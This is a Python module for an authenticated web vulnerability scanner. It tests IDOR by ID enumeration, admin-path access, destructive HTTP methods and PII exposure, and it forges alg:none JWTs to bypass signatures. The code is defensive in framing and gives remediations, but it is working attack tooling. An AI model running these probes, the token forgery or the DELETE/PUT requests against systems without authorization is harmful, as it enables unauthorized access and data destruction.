"""
Authenticated Scanner — tests authorization logic using a real session.
Requires the user to paste session cookies or a Bearer token from DevTools.

Tests:
  A. Horizontal IDOR     — increment numeric IDs in discovered API paths
  B. Vertical Priv-Esc   — probe admin paths with user session
  C. Broken Function Auth — try DELETE/PUT/PATCH on GET-only endpoints
  D. Sensitive Data Expo  — look for PII in /api/me, /profile, etc.
  E. JWT Algorithm Confusion — alg:none bypass if Bearer token is a JWT
"""

import re
import json
import math
import base64
import asyncio
from dataclasses import dataclass, field
from typing import Optional

import httpx


# ─── Finding ───────────────────────────────────────────────────────────────────

@dataclass
class Finding:
    title:       str
    severity:    str          # critical / high / medium / low / info
    description: str
    url:         str
    evidence:    str = ""
    remediation: str = ""
    extra:       dict = field(default_factory=dict)


# ─── Helpers ───────────────────────────────────────────────────────────────────

def _parse_cookies(cookie_str: str) -> dict:
    """Parse 'name=val; name2=val2' cookie header into dict."""
    result = {}
    for pair in cookie_str.split(";"):
        pair = pair.strip()
        if "=" in pair:
            k, v = pair.split("=", 1)
            result[k.strip()] = v.strip()
    return result


def _build_headers(auth_token: str = "") -> dict:
    h = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/html, */*",
    }
    if auth_token:
        h["Authorization"] = f"Bearer {auth_token}"
    return h


def _is_jwt(token: str) -> bool:
    parts = token.split(".")
    return len(parts) == 3


def _decode_jwt_header(token: str) -> Optional[dict]:
    try:
        header_b64 = token.split(".")[0]
        # add padding
        header_b64 += "=" * (4 - len(header_b64) % 4)
        return json.loads(base64.urlsafe_b64decode(header_b64))
    except Exception:
        return None


def _forge_none_jwt(token: str) -> str:
    """Rebuild JWT with alg:none and empty signature."""
    try:
        header, payload, _ = token.split(".")
        # decode header, replace alg
        pad = lambda s: s + "=" * (4 - len(s) % 4)
        hdr = json.loads(base64.urlsafe_b64decode(pad(header)))
        hdr["alg"] = "none"
        new_hdr = base64.urlsafe_b64encode(json.dumps(hdr, separators=(",", ":")).encode()).rstrip(b"=").decode()
        return f"{new_hdr}.{payload}."
    except Exception:
        return ""


# ─── Admin paths for vertical priv-esc ─────────────────────────────────────────

_ADMIN_PATHS = [
    "/admin", "/admin/", "/administrator", "/admin/dashboard",
    "/admin/users", "/admin/settings", "/admin/orders", "/admin/logs",
    "/api/admin", "/api/admin/users", "/api/admin/config",
    "/dashboard/admin", "/manage", "/management",
    "/wp-admin", "/wp-admin/user-edit.php",
    "/superuser", "/backoffice",
    "/api/v1/admin", "/api/v1/admin/users", "/api/v1/users",
    "/api/v2/admin", "/api/v2/admin/users",
]

_ADMIN_KEYWORDS = re.compile(
    r"(admin|dashboard|manage|users list|configuration|settings|control panel|panel)",
    re.I
)

# ─── Profile / sensitive paths ─────────────────────────────────────────────────

_PROFILE_PATHS = [
    "/api/me", "/api/user", "/api/profile", "/api/account",
    "/api/v1/me", "/api/v1/user", "/api/v1/profile",
    "/api/v2/me", "/api/v2/user",
    "/user/profile", "/account/profile",
    "/rest/user", "/rest/me",
]

# PII patterns
_PII = [
    (re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'), "email"),
    (re.compile(r'\b\d{3}[-.\s]?\d{3}[-.\s]?\d{4}\b'), "phone"),
    (re.compile(r'\b\d{3}-\d{2}-\d{4}\b'), "SSN"),
    (re.compile(r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b'), "credit card"),
    (re.compile(r'"password"\s*:\s*"[^"]+"'), "password field"),
    (re.compile(r'"token"\s*:\s*"[^"]{20,}"'), "token field"),
    (re.compile(r'"secret"\s*:\s*"[^"]+"'), "secret field"),
    (re.compile(r'"api_key"\s*:\s*"[^"]+"'), "api_key field"),
]

# HTTP methods for broken function-level auth
_EXTRA_METHODS = ["DELETE", "PUT", "PATCH"]


# ─── Section A: Horizontal IDOR ────────────────────────────────────────────────

async def _test_idor(client: httpx.AsyncClient, base_url: str, findings: list):
    """
    Probe common API resource paths with numeric IDs and try neighbour IDs.
    Flags if a different ID returns 200 with similar content-type.
    """
    resource_paths = [
        "/api/orders/{id}", "/api/v1/orders/{id}",
        "/api/users/{id}", "/api/v1/users/{id}",
        "/api/invoices/{id}", "/api/v1/invoices/{id}",
        "/api/tickets/{id}", "/api/v1/tickets/{id}",
        "/api/products/{id}", "/api/v1/products/{id}",
        "/api/addresses/{id}", "/api/v1/addresses/{id}",
        "/api/messages/{id}", "/api/v1/messages/{id}",
    ]

    for template in resource_paths:
        # try IDs 1-5 to find a live one
        for seed_id in range(1, 6):
            path = template.replace("{id}", str(seed_id))
            try:
                r = await client.get(base_url + path, timeout=6)
            except Exception:
                continue

            if r.status_code != 200:
                continue

            orig_ct = r.headers.get("content-type", "")
            if "json" not in orig_ct and "html" not in orig_ct:
                continue

            # found a live resource — now try a neighbour
            neighbour_id = seed_id + 1
            n_path = template.replace("{id}", str(neighbour_id))
            try:
                rn = await client.get(base_url + n_path, timeout=6)
            except Exception:
                continue

            if rn.status_code == 200 and rn.content != r.content:
                findings.append(Finding(
                    title="Potential Horizontal IDOR",
                    severity="high",
                    description=(
                        f"Resource at `{path}` (ID={seed_id}) returned 200. "
                        f"Accessing ID={neighbour_id} at `{n_path}` also returned 200 with different content. "
                        "If this is a different user's resource, it's an IDOR."
                    ),
                    url=base_url + n_path,
                    evidence=f"ID {seed_id}: {len(r.content)}B | ID {neighbour_id}: {len(rn.content)}B",
                    remediation="Verify ownership server-side for every resource access. Never trust client-supplied IDs alone.",
                ))
                break  # one finding per template is enough


# ─── Section B: Vertical Privilege Escalation ─────────────────────────────────

async def _test_vertical_privesc(client: httpx.AsyncClient, base_url: str, findings: list):
    """Probe admin paths with user session. Flag 200s that look like real admin UIs."""
    # baseline for soft-404
    baseline_size = None
    try:
        r404 = await client.get(base_url + "/xyzzy_nonexistent_admin_path_abc987", timeout=5)
        if r404.status_code == 200:
            baseline_size = len(r404.content)
    except Exception:
        pass

    tasks = [client.get(base_url + p, timeout=6) for p in _ADMIN_PATHS]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    for path, resp in zip(_ADMIN_PATHS, results):
        if isinstance(resp, Exception):
            continue
        if resp.status_code not in (200, 201):
            continue
        # skip soft-404
        if baseline_size and abs(len(resp.content) - baseline_size) / baseline_size < 0.10:
            continue
        body = resp.text
        if not _ADMIN_KEYWORDS.search(body) and len(body) < 500:
            continue

        findings.append(Finding(
            title="Admin Panel Accessible with User Session",
            severity="critical",
            description=(
                f"The admin path `{path}` returned HTTP {resp.status_code} when accessed "
                "with the provided user session. A regular user should receive 401/403."
            ),
            url=base_url + path,
            evidence=body[:300],
            remediation="Enforce role-based access control (RBAC) on all admin routes server-side.",
        ))


# ─── Section C: Broken Function-Level Authorization ───────────────────────────

async def _test_broken_function_auth(client: httpx.AsyncClient, base_url: str, findings: list):
    """
    For common REST paths, send DELETE/PUT/PATCH and flag unexpected 200/204.
    Only flags if the response is a real API response (JSON), not a soft-404 HTML page.
    """
    test_paths = [
        "/api/v1/users/1", "/api/users/1",
        "/api/v1/orders/1", "/api/orders/1",
        "/api/v1/settings", "/api/settings",
        "/api/v1/config", "/api/config",
    ]

    def _is_real_api(r) -> bool:
        """True only if response looks like a real API endpoint, not soft-404."""
        ct = r.headers.get("content-type", "")
        if "application/json" in ct:
            return True
        # HTML response = homepage / soft-404 — not a real endpoint
        if "text/html" in ct:
            return False
        body = r.text.strip()
        if body.startswith("<!") or body.startswith("<html"):
            return False
        # Small non-HTML response = might be real
        if len(body) < 5000 and "<!doctype" not in body.lower():
            return True
        return False

    for path in test_paths:
        # Only test if GET returns a real API response (not HTML homepage)
        try:
            get_r = await client.get(base_url + path, timeout=5)
        except Exception:
            continue
        if get_r.status_code not in (200, 201):
            continue
        if not _is_real_api(get_r):
            continue  # soft-404 — skip

        for method in _EXTRA_METHODS:
            try:
                r = await client.request(method, base_url + path, timeout=5, json={})
            except Exception:
                continue
            if r.status_code in (200, 201, 204) and _is_real_api(r):
                findings.append(Finding(
                    title=f"Broken Function-Level Auth — {method} Allowed",
                    severity="high",
                    description=(
                        f"`{method} {path}` returned HTTP {r.status_code}. "
                        "The endpoint accepts destructive HTTP methods that should be restricted."
                    ),
                    url=base_url + path,
                    evidence=f"{method} → {r.status_code} | body: {r.text[:200]}",
                    remediation=f"Restrict {method} to authorized roles only. Return 403 for unauthorized method calls.",
                ))


# ─── Section D: Sensitive Data Exposure ───────────────────────────────────────

async def _test_sensitive_exposure(client: httpx.AsyncClient, base_url: str, findings: list):
    """GET known profile/user endpoints and scan response for PII."""
    for path in _PROFILE_PATHS:
        try:
            r = await client.get(base_url + path, timeout=6)
        except Exception:
            continue
        if r.status_code != 200:
            continue
        ct = r.headers.get("content-type", "")
        if "json" not in ct and "html" not in ct:
            continue

        body = r.text
        found_pii = []
        for pattern, label in _PII:
            if pattern.search(body):
                found_pii.append(label)

        if found_pii:
            findings.append(Finding(
                title="Sensitive Data Exposed in Authenticated Endpoint",
                severity="high",
                description=(
                    f"`{path}` returned data containing: {', '.join(found_pii)}. "
                    "Sensitive fields should be masked or omitted from API responses."
                ),
                url=base_url + path,
                evidence=body[:400],
                remediation=(
                    "Apply field-level filtering: never return passwords, raw tokens, or full credit card numbers. "
                    "Mask sensitive fields (e.g., last 4 digits only)."
                ),
            ))


# ─── Section E: JWT Algorithm Confusion ───────────────────────────────────────

async def _test_jwt_alg_none(client: httpx.AsyncClient, base_url: str,
                              auth_token: str, findings: list):
    """If auth_token is a JWT, try alg:none bypass on /api/me and similar."""
    if not _is_jwt(auth_token):
        return

    hdr = _decode_jwt_header(auth_token)
    if not hdr:
        return
    alg = hdr.get("alg", "")
    if alg.lower() == "none":
        return  # already none — nothing to test

    forged = _forge_none_jwt(auth_token)
    if not forged:
        return

    probe_paths = ["/api/me", "/api/v1/me", "/api/user", "/api/v1/user", "/api/profile"]
    # First find a live endpoint with real token
    live_path = None
    for path in probe_paths:
        try:
            r = await client.get(base_url + path, timeout=5)
            if r.status_code == 200:
                live_path = path
                break
        except Exception:
            continue

    if not live_path:
        return

    # Now try forged token
    forged_headers = dict(client.headers)
    forged_headers["Authorization"] = f"Bearer {forged}"
    try:
        rf = await client.get(base_url + live_path, headers=forged_headers, timeout=5)
    except Exception:
        return

    if rf.status_code == 200:
        findings.append(Finding(
            title="JWT Algorithm Confusion (alg:none Accepted)",
            severity="critical",
            description=(
                f"The server accepted a JWT with `alg:none` (no signature) on `{live_path}`. "
                "An attacker can forge arbitrary tokens without knowing the secret key."
            ),
            url=base_url + live_path,
            evidence=f"Forged token: {forged[:80]}... → HTTP {rf.status_code}",
            remediation=(
                "Explicitly whitelist allowed algorithms server-side. "
                "Reject tokens where alg=none. Use a strict JWT library that does not allow algorithm switching."
            ),
        ))


# ─── Entry Point ───────────────────────────────────────────────────────────────

async def scan_authenticated(
    base_url: str,
    cookies: str = "",
    auth_token: str = "",
    log=None,
) -> list:
    """
    Run all authenticated scan tests.
    Returns list of Finding objects.
    """
    def _log(msg):
        if log:
            log(msg)

    base_url = base_url.rstrip("/")
    findings: list[Finding] = []

    if not cookies and not auth_token:
        findings.append(Finding(
            title="No Authentication Provided",
            severity="info",
            description="Authenticated scan skipped — no session cookie or Bearer token was provided.",
            url=base_url,
            remediation="Paste your session cookie or Bearer token in the Auth section of the scan UI.",
        ))
        return findings

    cookie_dict = _parse_cookies(cookies) if cookies else {}
    headers = _build_headers(auth_token)

    _log("Authenticated scan: starting with provided session…")

    async with httpx.AsyncClient(
        headers=headers,
        cookies=cookie_dict,
        verify=False,
        follow_redirects=True,
        timeout=12,
    ) as client:

        _log("A. Testing horizontal IDOR (resource ID enumeration)…")
        await _test_idor(client, base_url, findings)

        _log("B. Testing vertical privilege escalation (admin path access)…")
        await _test_vertical_privesc(client, base_url, findings)

        _log("C. Testing broken function-level authorization (DELETE/PUT/PATCH)…")
        await _test_broken_function_auth(client, base_url, findings)

        _log("D. Scanning for sensitive data exposure in profile endpoints…")
        await _test_sensitive_exposure(client, base_url, findings)

        if auth_token:
            _log("E. Testing JWT algorithm confusion (alg:none bypass)…")
            await _test_jwt_alg_none(client, base_url, auth_token, findings)

    real = [f for f in findings if f.severity != "info"]
    _log(f"Authenticated scan complete — {len(real)} finding(s).")
    return findings
